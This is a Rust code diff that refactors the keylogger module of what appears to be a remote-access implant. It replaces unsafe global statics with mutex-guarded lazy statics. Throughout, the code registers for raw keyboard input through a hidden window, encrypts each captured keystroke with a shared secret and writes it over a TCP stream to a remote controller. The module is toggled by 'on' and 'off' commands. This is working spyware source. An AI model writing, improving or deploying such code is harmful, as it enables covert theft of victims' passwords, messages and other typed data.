@@ -4,6 +4,7 @@ mod types;
 
 pub use constants::*;
 pub use external::*;
+use once_cell::sync::Lazy;
 use std::mem::{self, MaybeUninit};
 use std::ops::Deref;
 use std::ptr;
@@ -210,102 +211,101 @@ use simple_crypt::encrypt;
 use std::{
     io::Write,
     net::TcpStream,
-    sync::{Mutex, Arc, atomic::{AtomicBool, Ordering}},
-    thread::JoinHandle
+    sync::{
+        atomic::{AtomicBool, Ordering},
+        Mutex,
+    },
+    thread::JoinHandle,
 };
 
-static mut STREAM: Option<Mutex<TcpStream>> = None;
-static mut SHARED_SECRET: Option<[u8; 32]> = None;
-static mut THREAD_HANDLE: Option<Arc<Mutex<Option<JoinHandle<()>>>>> = None;
-static mut STOP_FLAG: Option<Arc<AtomicBool>> = None;
+static STREAM: Lazy<Mutex<Option<TcpStream>>> = Lazy::new(|| Mutex::new(None));
+static SHARED_SECRET: Lazy<Mutex<Option<[u8; 32]>>> = Lazy::new(|| Mutex::new(None));
+static THREAD_HANDLE: Lazy<Mutex<Option<JoinHandle<()>>>> = Lazy::new(|| Mutex::new(None));
+static STOP_FLAG: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
 
 const CLASS_NAME: &str = "kl";
 
-pub fn keylogger(stream: &mut TcpStream, command: String, shared_secret: &[u8; 32]) -> Result<Box<dyn std::error::Error>> {
+pub fn keylogger(
+    stream: &mut TcpStream,
+    command: String,
+    shared_secret: &[u8; 32],
+) -> Result<Box<dyn std::error::Error>> {
     let parts: Vec<&str> = command.split(" ").collect();
     let state = parts[1];
 
     // Store the stream and shared_secret in the static variables
-    unsafe {
-        STREAM = Some(Mutex::new(stream.try_clone().unwrap()));
-        SHARED_SECRET = Some(*shared_secret);
-    }
+    *STREAM.lock().unwrap() = Some(stream.try_clone().unwrap());
+    *SHARED_SECRET.lock().unwrap() = Some(*shared_secret);
 
     match state {
         "on" => {
-            unsafe {
-                if STOP_FLAG.is_none() {
-                    STOP_FLAG = Some(Arc::new(AtomicBool::new(false)));
-                }
-
-                if THREAD_HANDLE.is_none() {
-                    THREAD_HANDLE = Some(Arc::new(Mutex::new(None)));
-                } else if THREAD_HANDLE.as_ref().unwrap().lock().unwrap().is_some() {
-                    return Ok(Box::new(std::io::Error::new(std::io::ErrorKind::AlreadyExists, "Keylogger already running")));
-                }
-
-                let thread_handle = THREAD_HANDLE.as_ref().unwrap().clone();
-                let stop_flag = STOP_FLAG.as_ref().unwrap().clone();
-                let handle = std::thread::spawn(move || {
-                    let instance = get_module_handle().unwrap();
-                    register_class(instance, CLASS_NAME, Some(wnd_proc)).unwrap();
-                    let wnd = create_window(instance, CLASS_NAME).unwrap();
-                    loop {
-                        if stop_flag.load(Ordering::Relaxed) {
-                            break;
-                        }
-                        let (msg, quit) = get_message(wnd).unwrap();
-                        if quit {
-                            break;
-                        }
-                
-                        translate_message(&msg);
-                        dispatch_message(&msg);
-                    };
-                });
-
-                *thread_handle.lock().unwrap() = Some(handle);
+            if STOP_FLAG.load(Ordering::Relaxed) {
+                return Ok(Box::new(std::io::Error::new(
+                    std::io::ErrorKind::AlreadyExists,
+                    "Keylogger already running",
+                )));
             }
+
+            if THREAD_HANDLE.lock().unwrap().is_some() {
+                return Ok(Box::new(std::io::Error::new(
+                    std::io::ErrorKind::AlreadyExists,
+                    "Keylogger already running",
+                )));
+            }
+
+            let thread_handle = &THREAD_HANDLE;
+            let stop_flag = &STOP_FLAG;
+            let handle = std::thread::spawn(move || {
+                let instance = get_module_handle().unwrap();
+                register_class(instance, CLASS_NAME, Some(wnd_proc)).unwrap();
+                let wnd = create_window(instance, CLASS_NAME).unwrap();
+                loop {
+                    if stop_flag.load(Ordering::Relaxed) {
+                        break;
+                    }
+                    let (msg, quit) = get_message(wnd).unwrap();
+                    if quit {
+                        break;
+                    }
+
+                    translate_message(&msg);
+                    dispatch_message(&msg);
+                }
+            });
+
+            *thread_handle.lock().unwrap() = Some(handle);
         }
         "off" => {
-            unsafe {
-                if let Some(stop_flag) = &STOP_FLAG {
-                    stop_flag.store(true, Ordering::Relaxed);
-                }
-                if let Some(thread_handle) = &THREAD_HANDLE {
-                    if let Some(handle) = thread_handle.lock().unwrap().take() {
-                        handle.join().unwrap();
-                    }
-                }
-                let message = format!("|!!done!!|");
-                let encrypted_data = encrypt(message.as_bytes(), shared_secret).expect("Failed to encrypt");
-                stream.write(&encrypted_data).expect("Error writing to stream");
-                stream.flush().expect("Error flushing stream");
-                STOP_FLAG = None;
+            STOP_FLAG.store(true, Ordering::Relaxed);
+            if let Some(handle) = THREAD_HANDLE.lock().unwrap().take() {
+                handle.join().unwrap();
             }
+            let message = format!("|!!done!!|");
+            let encrypted_data =
+                encrypt(message.as_bytes(), shared_secret).expect("Failed to encrypt");
+            stream
+                .write(&encrypted_data)
+                .expect("Error writing to stream");
+            stream.flush().expect("Error flushing stream");
+            STOP_FLAG.store(false, Ordering::Relaxed);
         }
         _ => {
-            return Ok(Box::new(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid state")));
+            return Ok(Box::new(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                "Invalid state",
+            )));
         }
     }
-    Ok(Box::new(std::io::Error::new(std::io::ErrorKind::Other, "Keylogger exited")))
+    Ok(Box::new(std::io::Error::new(
+        std::io::ErrorKind::Other,
+        "Keylogger exited",
+    )))
 }
 
-extern "C" fn wnd_proc(
-    wnd: HWnd,
-    message: u32,
-    wparam: WParam,
-    lparam: LParam,
-) -> LResult {
+extern "C" fn wnd_proc(wnd: HWnd, message: u32, wparam: WParam, lparam: LParam) -> LResult {
     match message {
         WM_CREATE => {
-            register_raw_input_devices(
-                wnd,
-                &[
-                    RawInputType::Keyboard,
-                ],
-            )
-            .unwrap();
+            register_raw_input_devices(wnd, &[RawInputType::Keyboard]).unwrap();
         }
         WM_INPUT => {
             let raw_input = match get_raw_input_data(lparam as HRawInput) {
@@ -322,13 +322,16 @@ extern "C" fn wnd_proc(
                 println!("Pressed '{}'", key);
 
                 // Access the stream and shared_secret
-                unsafe {
-                    if let (Some(ref stream_mutex), Some(ref shared_secret)) = (&STREAM, &SHARED_SECRET) {
-                        let mut stream = stream_mutex.lock().unwrap();
-                        let encrypted_data = encrypt(key.to_string().as_bytes(), shared_secret).expect("Failed to encrypt");
-                        stream.write(&encrypted_data).expect("Error writing to stream");
-                        stream.flush().expect("Error flushing stream");
-                    }
+                if let (Some(ref mut stream), Some(ref shared_secret)) = (
+                    &mut *STREAM.lock().unwrap(),
+                    &*SHARED_SECRET.lock().unwrap(),
+                ) {
+                    let encrypted_data = encrypt(key.to_string().as_bytes(), shared_secret)
+                        .expect("Failed to encrypt");
+                    stream
+                        .write(&encrypted_data)
+                        .expect("Error writing to stream");
+                    stream.flush().expect("Error flushing stream");
                 }
             }
         }
